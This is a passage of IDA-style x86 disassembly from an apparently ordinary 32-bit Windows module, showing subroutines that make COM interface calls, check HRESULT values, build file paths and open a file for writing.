                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_143BC       proc near               ; CODE XREF: sub_1495E+1D↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                mov     esi, ecx
                test    edi, edi
                jnz     short loc_143D3
                mov     eax, 80004003h
                jmp     short loc_143F8
; ---------------------------------------------------------------------------

loc_143D3:                              ; CODE XREF: sub_143BC+E↑j
                xor     eax, eax
                cmp     [esi+0Ch], eax
                jnz     short loc_143E2
                push    [ebp+arg_0]
                call    sub_14403

loc_143E2:                              ; CODE XREF: sub_143BC+1C↑j
                mov     ecx, [esi+0Ch]
                mov     [edi], ecx
                cmp     dword ptr [esi+0Ch], 0
                jz      short loc_143F8
                mov     eax, [esi+0Ch]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+4]
                xor     eax, eax

loc_143F8:                              ; CODE XREF: sub_143BC+15↑j
                                        ; sub_143BC+2F↑j
                pop     edi
                pop     esi
                pop     ebp
                retn    8
sub_143BC       endp

; ---------------------------------------------------------------------------
                align 10h
byte_14400      db 3 dup(0CCh)          ; DATA XREF: sub_6A78+1E3↑o

; =============== S U B R O U T I N E =======================================


sub_14403       proc near               ; CODE XREF: sub_143BC+21↑p
                                        ; sub_14656+1C↓p ...
                push    224h
                mov     eax, 100A560h
                call    sub_1663E
                mov     esi, ecx
                xor     ecx, ecx
                cmp     [esi+0Ch], ecx
                jz      short loc_14427
                cmp     [esi+14h], ecx
                jz      short loc_14427
                xor     eax, eax
                jmp     loc_1460F
; ---------------------------------------------------------------------------

loc_14427:                              ; CODE XREF: sub_14403+16↑j
                                        ; sub_14403+1B↑j
                mov     ebx, ds:100C364h
                add     ebx, 10h
                mov     [ebp-230h], ebx
                push    ebx
                mov     [ebp-4], ecx
                call    dword ptr ds:100113Ch
                cmp     dword ptr [esi+0Ch], 0
                mov     byte ptr [ebp-22Ch], 1
                mov     edi, 80004005h
                jnz     loc_145EC
                push    dword ptr [esi+4]
                and     dword ptr [ebp-228h], 0
                push    100C368h
                call    sub_13833
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_144D6
                mov     eax, 0FFFFh
                cmp     [esi+8], ax
                jnz     short loc_144D6
                cmp     [esi+0Ah], ax
                jnz     short loc_144D6
                push    104h
                lea     eax, [ebp-218h]
                push    eax
                push    dword ptr ds:100C6D0h
                call    dword ptr ds:1001060h
                test    eax, eax
                jz      loc_145EE
                cmp     eax, 104h
                jz      loc_145EE
                and     dword ptr [ebp-21Ch], 0
                lea     eax, [ebp-228h]
                push    eax
                lea     eax, [ebp-218h]
                push    eax
                call    dword ptr ds:100124Ch
                lea     ecx, [ebp-21Ch]
                mov     edi, eax
                call    sub_13919
                jmp     short loc_144F5
; ---------------------------------------------------------------------------

loc_144D6:                              ; CODE XREF: sub_14403+6B↑j
                                        ; sub_14403+76↑j ...
                lea     eax, [ebp-228h]
                push    eax
                push    dword ptr [ebp+8]
                movzx   eax, word ptr [esi+0Ah]
                push    eax
                movzx   eax, word ptr [esi+8]
                push    eax
                push    dword ptr [esi+4]
                call    dword ptr ds:1001250h
                mov     edi, eax

loc_144F5:                              ; CODE XREF: sub_14403+D1↑j
                test    edi, edi
                js      loc_145EE
                and     dword ptr [ebp-220h], 0
                mov     eax, [ebp-228h]
                mov     ecx, [eax]
                lea     edx, [ebp-220h]
                push    edx
                push    dword ptr [esi]
                mov     byte ptr [ebp-4], 1
                push    eax
                call    dword ptr [ecx+18h]
                mov     edi, eax
                test    edi, edi
                js      loc_145CA
                mov     eax, [ebp-220h]
                mov     [ebp-224h], eax
                test    eax, eax
                jz      short loc_14543
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+4]
                mov     eax, [ebp-220h]

loc_14543:                              ; CODE XREF: sub_14403+132↑j
                and     dword ptr [ebp-21Ch], 0
                mov     ecx, [eax]
                lea     edx, [ebp-21Ch]
                push    edx
                push    1001760h
                push    eax
                mov     byte ptr [ebp-4], 3
                call    dword ptr [ecx]
                test    eax, eax
                js      short loc_14575
                lea     eax, [ebp-21Ch]
                push    eax
                lea     ecx, [ebp-224h]
                call    sub_14906

loc_14575:                              ; CODE XREF: sub_14403+15E↑j
                mov     eax, [ebp-224h]
                and     dword ptr [ebp-224h], 0
                mov     [esi+0Ch], eax
                mov     eax, ds:100C364h
                test    eax, eax
                jz      short loc_14593
                add     eax, 4
                jmp     short loc_14595
; ---------------------------------------------------------------------------

loc_14593:                              ; CODE XREF: sub_14403+189↑j
                xor     eax, eax

loc_14595:                              ; CODE XREF: sub_14403+18E↑j
                push    esi
                push    10039C4h
                push    eax
                call    dword ptr ds:1001018h
                mov     eax, [ebp-21Ch]
                mov     byte ptr [ebp-4], 2
                test    eax, eax
                jz      short loc_145B6
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_145B6:                              ; CODE XREF: sub_14403+1AB↑j
                mov     eax, [ebp-224h]
                mov     byte ptr [ebp-4], 1
                test    eax, eax
                jz      short loc_145CA
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]

loc_145CA:                              ; CODE XREF: sub_14403+11E↑j
                                        ; sub_14403+1BF↑j
                mov     eax, [ebp-228h]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]
                mov     eax, [ebp-220h]
                mov     byte ptr [ebp-4], 0
                test    eax, eax
                jz      short loc_145EE
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]
                jmp     short loc_145EE
; ---------------------------------------------------------------------------

loc_145EC:                              ; CODE XREF: sub_14403+4D↑j
                xor     edi, edi

loc_145EE:                              ; CODE XREF: sub_14403+98↑j
                                        ; sub_14403+A3↑j ...
                cmp     dword ptr [esi+0Ch], 0
                jz      short loc_14606
                cmp     dword ptr [esi+14h], 0
                jnz     short loc_14606
                push    dword ptr [esi+0Ch]
                mov     ecx, esi
                call    sub_1475E
                mov     edi, eax

loc_14606:                              ; CODE XREF: sub_14403+1EF↑j
                                        ; sub_14403+1F5↑j
                push    ebx
                call    dword ptr ds:1001138h
                mov     eax, edi

loc_1460F:                              ; CODE XREF: sub_14403+1F↑j
                call    sub_16692
                retn    4
sub_14403       endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1461C       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jz      short loc_1464C
                mov     ecx, [esi+0Ch]
                test    ecx, ecx
                jz      short loc_14636
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

loc_14636:                              ; CODE XREF: sub_1461C+12↑j
                mov     ecx, [esi+14h]
                and     dword ptr [esi+0Ch], 0
                test    ecx, ecx
                jz      short loc_14648
                push    3
                call    sub_14368

loc_14648:                              ; CODE XREF: sub_1461C+23↑j
                and     dword ptr [esi+14h], 0

loc_1464C:                              ; CODE XREF: sub_1461C+B↑j
                pop     esi
                pop     ebp
                retn    4
sub_1461C       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14656       proc near               ; CODE XREF: sub_14989+19↓p

var_4           = dword ptr -4
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    ebx
                push    esi
                xor     ebx, ebx
                mov     esi, ecx
                mov     eax, ebx
                cmp     [esi+0Ch], ebx
                jz      short loc_1466F
                cmp     [esi+14h], ebx
                jnz     short loc_14677

loc_1466F:                              ; CODE XREF: sub_14656+12↑j
                push    [ebp+arg_C]
                call    sub_14403

loc_14677:                              ; CODE XREF: sub_14656+17↑j
                cmp     [esi+0Ch], ebx
                jz      short loc_146F6
                cmp     [esi+14h], ebx
                mov     ebx, [ebp+arg_4]
                push    edi
                jz      short loc_146E5
                cmp     [ebp+arg_8], 1
                jnz     short loc_146E5
                push    dword ptr [ebx]
                call    dword ptr ds:1001058h
                mov     edi, [esi+18h]
                dec     edi
                mov     ecx, eax
                mov     [ebp+var_4], ecx
                js      short loc_146E5
                mov     eax, [esi+14h]
                mov     ebx, edi
                imul    ebx, 0Ch
                add     eax, 4
                add     eax, ebx
                mov     [ebp+arg_C], eax

loc_146AE:                              ; CODE XREF: sub_14656+8A↓j
                cmp     ecx, [eax]
                jnz     short loc_146D6
                mov     ecx, [esi+14h]
                mov     eax, [ebx+ecx+4]
                add     eax, eax
                push    eax
                mov     eax, [ebp+arg_4]
                push    dword ptr [eax]
                push    dword ptr [ebx+ecx]
                call    sub_1673A
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_146FC
                mov     eax, [ebp+arg_C]
                mov     ecx, [ebp+var_4]

loc_146D6:                              ; CODE XREF: sub_14656+5A↑j
                sub     eax, 0Ch
                sub     ebx, 0Ch
                dec     edi
                mov     [ebp+arg_C], eax
                jns     short loc_146AE
                mov     ebx, [ebp+arg_4]

loc_146E5:                              ; CODE XREF: sub_14656+2D↑j
                                        ; sub_14656+33↑j ...
                push    [ebp+arg_10]
                mov     eax, [esi+0Ch]
                push    [ebp+arg_8]
                mov     ecx, [eax]
                push    ebx
                push    eax
                call    dword ptr [ecx+28h]

loc_146F5:                              ; CODE XREF: sub_14656+B7↓j
                pop     edi

loc_146F6:                              ; CODE XREF: sub_14656+24↑j
                pop     esi
                pop     ebx
                leave
                retn    14h
; ---------------------------------------------------------------------------

loc_146FC:                              ; CODE XREF: sub_14656+78↑j
                mov     ecx, [esi+14h]
                imul    edi, 0Ch
                mov     eax, [ebp+arg_10]
                mov     ecx, [edi+ecx+8]
                mov     [eax], ecx
                xor     eax, eax
                jmp     short loc_146F5
sub_14656       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14714       proc near               ; CODE XREF: sub_149B0+B↓j

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h
arg_1C          = dword ptr  24h
arg_20          = dword ptr  28h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                xor     eax, eax
                cmp     [esi+0Ch], eax
                jz      short loc_14728
                cmp     [esi+14h], eax
                jnz     short loc_14730

loc_14728:                              ; CODE XREF: sub_14714+D↑j
                push    [ebp+arg_C]
                call    sub_14403

loc_14730:                              ; CODE XREF: sub_14714+12↑j
                cmp     dword ptr [esi+0Ch], 0
                jz      short loc_14754
                push    [ebp+arg_20]
                mov     eax, [esi+0Ch]
                push    [ebp+arg_1C]
                mov     ecx, [eax]
                push    [ebp+arg_18]
                push    [ebp+arg_14]
                push    [ebp+arg_10]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                push    eax
                call    dword ptr [ecx+2Ch]

loc_14754:                              ; CODE XREF: sub_14714+20↑j
                pop     esi
                pop     ebp
                retn    24h ; '$'
sub_14714       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_1475E       proc near               ; CODE XREF: sub_14403+1FC↑p
                push    20h ; ' '
                mov     eax, 100A59Fh
                call    sub_16603
                mov     [ebp-1Ch], ecx
                mov     esi, [ebp+8]
                mov     eax, [esi]
                lea     ecx, [ebp-24h]
                push    ecx
                push    esi
                call    dword ptr [eax+0Ch]
                test    eax, eax
                js      loc_148E5
                mov     eax, [ebp-24h]
                movzx   eax, word ptr [eax+2Ch]
                mov     ecx, [ebp-1Ch]
                xor     edi, edi
                mov     ebx, edi
                mov     [ebp-18h], ebx
                mov     [ecx+18h], eax
                mov     [ecx+14h], edi
                mov     [ebp-28h], eax
                test    eax, eax
                jz      loc_1482C
                xor     ecx, ecx
                push    0Ch
                pop     edx
                mul     edx
                seto    cl
                mov     [ebp-4], edi
                neg     ecx
                or      ecx, eax
                xor     eax, eax
                add     ecx, 4
                setb    al
                neg     eax
                or      eax, ecx
                push    eax
                call    sub_16594
                pop     ecx
                mov     [ebp-2Ch], eax
                mov     byte ptr [ebp-4], 1
                test    eax, eax
                jz      short loc_147F3
                mov     ecx, [ebp-28h]
                push    1003702h
                push    10036EFh
                push    ecx
                lea     ebx, [eax+4]
                push    0Ch
                push    ebx
                mov     [eax], ecx
                mov     [ebp-18h], ebx
                call    sub_1626F
                jmp     short loc_147F8
; ---------------------------------------------------------------------------

loc_147F3:                              ; CODE XREF: sub_1475E+73↑j
                mov     ebx, edi
                mov     [ebp-18h], edi

loc_147F8:                              ; CODE XREF: sub_1475E+93↑j
                or      dword ptr [ebp-4], 0FFFFFFFFh
                jmp     short loc_14812
; ---------------------------------------------------------------------------
                or      dword ptr [ebp-4], 0FFFFFFFFh
                mov     eax, 1003BB0h
                retn
; ---------------------------------------------------------------------------
                mov     esi, [ebp+8]
                xor     edi, edi
                mov     ebx, edi
                mov     [ebp-18h], ebx

loc_14812:                              ; CODE XREF: sub_1475E+9E↑j
                test    ebx, ebx
                jnz     short loc_14829
                push    dword ptr [ebp-24h]
                mov     eax, [esi]
                push    esi
                call    dword ptr [eax+4Ch]
                mov     eax, 8007000Eh
                jmp     loc_148E7
; ---------------------------------------------------------------------------

loc_14829:                              ; CODE XREF: sub_1475E+B6↑j
                mov     ecx, [ebp-1Ch]

loc_1482C:                              ; CODE XREF: sub_1475E+40↑j
                mov     edx, edi
                mov     [ebp-28h], edx
                cmp     [ecx+18h], edi
                jle     loc_148D9
                mov     [ebp+8], ebx
                mov     ebx, [ebp-1Ch]

loc_14840:                              ; CODE XREF: sub_1475E+16F↓j
                mov     eax, [esi]
                lea     ecx, [ebp-20h]
                push    ecx
                push    edx
                push    esi
                call    dword ptr [eax+14h]
                test    eax, eax
                js      short loc_148BF
                mov     [ebp-14h], edi
                mov     ecx, [esi]
                push    edi
                push    edi
                push    edi
                lea     eax, [ebp-14h]
                push    eax
                mov     eax, [ebp-20h]
                push    dword ptr [eax]
                mov     dword ptr [ebp-4], 3
                push    esi
                call    dword ptr [ecx+30h]
                test    eax, eax
                js      short loc_148A8
                mov     ecx, [ebp-14h]
                mov     eax, [ebp+8]
                mov     edx, [eax]
                mov     [ebp-2Ch], ecx
                mov     [ebp-14h], edi
                cmp     edx, ecx
                jz      short loc_14890
                push    edx
                call    dword ptr ds:1001244h
                mov     eax, [ebp+8]
                mov     ecx, [ebp-2Ch]
                mov     [eax], ecx

loc_14890:                              ; CODE XREF: sub_1475E+121↑j
                push    dword ptr [eax]
                call    dword ptr ds:1001248h
                mov     ecx, [ebp+8]
                mov     edx, [ebp-20h]
                mov     [ecx+4], eax
                mov     eax, [edx]
                mov     [ecx+8], eax
                jmp     short loc_148AB
; ---------------------------------------------------------------------------

loc_148A8:                              ; CODE XREF: sub_1475E+10F↑j
                mov     edx, [ebp-20h]

loc_148AB:                              ; CODE XREF: sub_1475E+148↑j
                mov     eax, [esi]
                push    edx
                push    esi
                call    dword ptr [eax+50h]
                push    dword ptr [ebp-14h]
                or      dword ptr [ebp-4], 0FFFFFFFFh
                call    dword ptr ds:1001244h

loc_148BF:                              ; CODE XREF: sub_1475E+EF↑j
                mov     edx, [ebp-28h]
                add     dword ptr [ebp+8], 0Ch
                inc     edx
                mov     [ebp-28h], edx
                cmp     edx, [ebx+18h]
                jl      loc_14840
                mov     ebx, [ebp-18h]
                mov     ecx, [ebp-1Ch]

loc_148D9:                              ; CODE XREF: sub_1475E+D6↑j
                push    dword ptr [ebp-24h]
                mov     [ecx+14h], ebx
                mov     eax, [esi]
                push    esi
                call    dword ptr [eax+4Ch]

loc_148E5:                              ; CODE XREF: sub_1475E+1E↑j
                xor     eax, eax

loc_148E7:                              ; CODE XREF: sub_1475E+C6↑j
                call    sub_16679
                retn    4
sub_1475E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_148F4:                              ; CODE XREF: CODE:0001B1B3↓j
                mov     ecx, [ecx]
                test    ecx, ecx
                jz      short locret_14900
                mov     eax, [ecx]
                push    ecx
                call    dword ptr [eax+8]

locret_14900:                           ; CODE XREF: CODE:000148F8↑j
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14906       proc near               ; CODE XREF: sub_14403+16D↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                push    dword ptr [edi]
                mov     esi, ecx
                call    sub_141F1
                test    al, al
                jnz     short loc_1492D
                push    1001770h
                push    dword ptr [edi]
                push    esi
                call    dword ptr ds:100103Ch
                jmp     short loc_1492F
; ---------------------------------------------------------------------------

loc_1492D:                              ; CODE XREF: sub_14906+15↑j
                mov     eax, [esi]

loc_1492F:                              ; CODE XREF: sub_14906+25↑j
                pop     edi
                pop     esi
                pop     ebp
                retn    4
sub_14906       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1493A       proc near

arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                test    eax, eax
                jnz     short loc_1494D
                mov     eax, 80004003h
                jmp     short loc_14955
; ---------------------------------------------------------------------------

loc_1494D:                              ; CODE XREF: sub_1493A+A↑j
                mov     dword ptr [eax], 1
                xor     eax, eax

loc_14955:                              ; CODE XREF: sub_1493A+11↑j
                pop     ebp
                retn    8
sub_1493A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1495E       proc near

arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                jz      short loc_14970
                mov     eax, 8002000Bh
                jmp     short loc_14980
; ---------------------------------------------------------------------------

loc_14970:                              ; CODE XREF: sub_1495E+9↑j
                push    [ebp+arg_C]
                mov     ecx, 100C050h
                push    [ebp+arg_8]
                call    sub_143BC

loc_14980:                              ; CODE XREF: sub_1495E+10↑j
                pop     ebp
                retn    10h
sub_1495E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14989       proc near

arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    [ebp+arg_14]
                mov     ecx, 100C050h
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                call    sub_14656
                pop     ebp
                retn    18h
sub_14989       endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_149B0       proc near
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, 100C050h
                pop     ebp
                jmp     sub_14714
sub_149B0       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_149C5       proc near               ; CODE XREF: sub_14D5F+40↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                and     dword ptr [esi], 0
                test    eax, eax
                jnz     short loc_149E3
                push    eax
                call    dword ptr ds:1001064h
                test    eax, eax
                jz      short loc_149F8

loc_149E3:                              ; CODE XREF: sub_149C5+11↑j
                push    10014D0h
                push    eax
                call    dword ptr ds:100115Ch
                test    eax, eax
                jz      short loc_149F8
                push    esi
                call    eax
                jmp     short loc_14A0C
; ---------------------------------------------------------------------------

loc_149F8:                              ; CODE XREF: sub_149C5+1C↑j
                                        ; sub_149C5+2C↑j
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_14A0C
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_14A0C:                              ; CODE XREF: sub_149C5+31↑j
                                        ; sub_149C5+3B↑j
                pop     esi
                pop     ebp
                retn
sub_149C5       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14A14       proc near               ; CODE XREF: sub_14A83+1A8↓p
                                        ; sub_14A83+229↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                push    esi
                xor     esi, esi
                test    ecx, ecx
                jz      short loc_14A2B
                cmp     ecx, 7FFFFFFFh
                jbe     short loc_14A30

loc_14A2B:                              ; CODE XREF: sub_14A14+D↑j
                mov     esi, 80070057h

loc_14A30:                              ; CODE XREF: sub_14A14+15↑j
                test    esi, esi
                js      short loc_14A77
                mov     edx, [ebp+arg_0]
                xor     esi, esi
                test    ecx, ecx
                jz      short loc_14A6A
                push    ebx
                mov     ebx, [ebp+arg_8]
                push    edi
                mov     edi, 7FFFFFFEh
                sub     edi, ecx
                sub     ebx, edx

loc_14A4B:                              ; CODE XREF: sub_14A14+4E↓j
                lea     eax, [edi+ecx]
                test    eax, eax
                jz      short loc_14A64
                movzx   eax, word ptr [ebx+edx]
                test    ax, ax
                jz      short loc_14A64
                mov     [edx], ax
                add     edx, 2
                dec     ecx
                jnz     short loc_14A4B

loc_14A64:                              ; CODE XREF: sub_14A14+3C↑j
                                        ; sub_14A14+45↑j
                pop     edi
                pop     ebx
                test    ecx, ecx
                jnz     short loc_14A72

loc_14A6A:                              ; CODE XREF: sub_14A14+27↑j
                sub     edx, 2
                mov     esi, 8007007Ah

loc_14A72:                              ; CODE XREF: sub_14A14+54↑j
                xor     eax, eax
                mov     [edx], ax

loc_14A77:                              ; CODE XREF: sub_14A14+1E↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    0Ch
sub_14A14       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_14A83       proc near               ; CODE XREF: sub_14D47+A↓p
                                        ; sub_14E68+A↓p
                push    634h
                push    100A880h
                call    sub_166A8
                mov     esi, [ebp+8]
                mov     [ebp-644h], esi
                mov     ebx, [ebp+0Ch]
                mov     ecx, ds:100C0F0h
                mov     [ebp-640h], ecx
                test    ecx, ecx
                jz      loc_14CF0
                xor     edi, edi
                mov     [ebp-638h], edi
                mov     [ebp-63Ch], edi
                mov     eax, [ecx]
                lea     edx, [ebp-638h]
                push    edx
                push    ecx
                call    dword ptr [eax+14h]
                test    eax, eax
                js      loc_14CF0
                push    100C0F8h
                call    dword ptr ds:100113Ch
                mov     [ebp-4], edi
                lea     eax, [ebp-63Ch]
                push    eax
                push    64h ; 'd'
                push    dword ptr ds:100C6D0h
                call    sub_16DE6
                add     esp, 0Ch
                cmp     [ebp-63Ch], edi
                jz      short loc_14B14
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                push    dword ptr [ebp-63Ch]
                push    eax
                call    dword ptr [ecx+48h]

loc_14B14:                              ; CODE XREF: sub_14A83+7D↑j
                test    esi, esi
                jz      short loc_14B2D
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                push    edi
                push    dword ptr ds:100C028h
                push    eax
                call    dword ptr [ecx+10h]
                jmp     short loc_14B49
; ---------------------------------------------------------------------------

loc_14B2D:                              ; CODE XREF: sub_14A83+93↑j
                mov     ecx, [ebp-638h]
                mov     edx, [ecx]
                push    400h
                mov     eax, ds:100C028h
                and     eax, 0FFFFFBFFh
                push    eax
                push    ecx
                call    dword ptr [edx+10h]

loc_14B49:                              ; CODE XREF: sub_14A83+A8↑j
                mov     edx, ds:100C02Ch
                test    edx, edx
                jz      short loc_14B61
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                push    edi
                push    edx
                push    eax
                call    dword ptr [ecx+14h]

loc_14B61:                              ; CODE XREF: sub_14A83+CE↑j
                mov     eax, [ebp-638h]
                test    esi, esi
                jz      short loc_14B8A
                mov     esi, [eax]
                mov     eax, [ebp-644h]
                push    dword ptr [eax+4]
                push    dword ptr [eax]
                call    dword ptr ds:1001148h
                push    eax
                push    dword ptr [ebp-638h]
                call    dword ptr [esi+20h]
                jmp     short loc_14B98
; ---------------------------------------------------------------------------

loc_14B8A:                              ; CODE XREF: sub_14A83+E6↑j
                mov     eax, [eax]
                push    dword ptr [ebp+4]
                push    dword ptr [ebp-638h]
                call    dword ptr [eax+64h]

loc_14B98:                              ; CODE XREF: sub_14A83+105↑j
                cmp     word ptr ds:100C110h, 0
                jz      loc_14C3D
                mov     esi, 104h
                push    esi
                lea     eax, [ebp-634h]
                push    eax
                call    sub_16F0A
                push    dword ptr ds:100C318h
                push    100C110h
                lea     eax, [ebp-634h]
                push    eax
                push    10014E4h
                push    esi
                lea     eax, [ebp-224h]
                push    eax
                mov     esi, ds:1001198h
                call    esi
                push    dword ptr ds:100C318h
                push    100C110h
                lea     eax, [ebp-634h]
                push    eax
                push    10014FCh
                push    104h
                lea     eax, [ebp-42Ch]
                push    eax
                call    esi
                add     esp, 38h
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                lea     edx, [ebp-42Ch]
                push    edx
                push    eax
                call    dword ptr [ecx+38h]
                test    ebx, ebx
                jz      short loc_14C30
                lea     eax, [ebp-42Ch]
                push    eax
                push    104h
                push    ebx
                call    sub_14A14

loc_14C30:                              ; CODE XREF: sub_14A83+199↑j
                push    100C318h
                call    dword ptr ds:1001164h
                jmp     short loc_14C50
; ---------------------------------------------------------------------------

loc_14C3D:                              ; CODE XREF: sub_14A83+11D↑j
                push    104h
                lea     eax, [ebp-224h]
                push    eax
                call    sub_16F9F
                pop     ecx
                pop     ecx

loc_14C50:                              ; CODE XREF: sub_14A83+1B8↑j
                push    edi
                push    80h
                push    2
                push    edi
                push    1
                push    40000000h
                lea     eax, [ebp-224h]
                push    eax
                call    dword ptr ds:100106Ch
                mov     ds:100C0F4h, eax
                test    eax, eax
                jz      short loc_14CB1
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                lea     edx, [ebp-224h]
                push    edx
                push    eax
                call    dword ptr [ecx+34h]
                push    dword ptr ds:100C0F4h
                call    sub_1700A
                pop     ecx
                test    ebx, ebx
                jz      short loc_14CB1
                lea     eax, [ebp-224h]
                push    eax
                push    104h
                lea     eax, [ebx+208h]
                push    eax
                call    sub_14A14

loc_14CB1:                              ; CODE XREF: sub_14A83+1F1↑j
                                        ; sub_14A83+214↑j
                test    dword ptr ds:100C028h, 8000h
                jz      short loc_14CCE
                push    dword ptr [ebp-638h]
                mov     ecx, [ebp-640h]
                call    sub_183A8

loc_14CCE:                              ; CODE XREF: sub_14A83+238↑j
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+0Ch]
                test    ebx, ebx
                jz      short loc_14CE4
                mov     [ebx+410h], eax

loc_14CE4:                              ; CODE XREF: sub_14A83+259↑j
                mov     dword ptr [ebp-4], 0FFFFFFFEh
                call    sub_14CFD

loc_14CF0:                              ; CODE XREF: sub_14A83+29↑j
                                        ; sub_14A83+4C↑j
                xor     eax, eax
                inc     eax
                call    sub_166F0
                retn    8
sub_14A83       endp

; ---------------------------------------------------------------------------
                xor     edi, edi

; =============== S U B R O U T I N E =======================================


sub_14CFD       proc near               ; CODE XREF: sub_14A83+268↑p
                mov     eax, [ebp-638h]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+8]
                cmp     dword ptr [ebp-63Ch], 0
                jz      short loc_14D24
                push    dword ptr [ebp-63Ch]
                call    dword ptr ds:1001244h
                mov     [ebp-63Ch], edi

loc_14D24:                              ; CODE XREF: sub_14CFD+13↑j
                push    dword ptr ds:100C0F4h
                call    dword ptr ds:1001054h
                mov     ds:100C0F4h, edi
                push    100C0F8h
                call    dword ptr ds:1001138h
                retn
sub_14CFD       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14D47       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                call    sub_14A83
                pop     ebp
                retn    4
sub_14D47       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_14D5F       proc near               ; CODE XREF: sub_1386A+92↑p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                push    esi
                push    edi
                xor     edi, edi
                push    edi
                push    edi
                push    1
                push    edi
                call    dword ptr ds:1001158h
                push    100C0F8h
                call    dword ptr ds:1001140h
                push    208h
                push    edi
                push    100C110h
                mov     ds:100C0F4h, edi
                call    sub_16746
                lea     eax, [ebp+var_4]
                push    edi
                push    eax
                mov     [ebp+var_4], edi
                call    sub_149C5
                mov     esi, eax
                add     esp, 14h
                test    esi, esi
                js      loc_14E52
                mov     eax, [ebp+var_4]
                mov     ecx, [eax]
                push    eax
                call    dword ptr [ecx+10h]
